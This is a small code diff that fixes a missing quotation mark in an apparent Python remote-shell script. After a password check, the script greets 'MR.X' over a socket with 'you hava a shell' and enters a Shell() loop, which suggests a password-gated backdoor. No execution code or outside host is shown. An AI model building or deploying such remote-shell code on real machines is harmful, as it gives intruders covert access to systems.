@@ -13,7 +13,7 @@ def Login():
         if pwd.strip() != passwd :
          Login()
         else:
-         s.send(bytes("wellcome MR.X ,you hava a shell))
+         s.send(bytes("wellcome MR.X ,you hava a shell"))
          Shell()
 def Shell():
         while True:
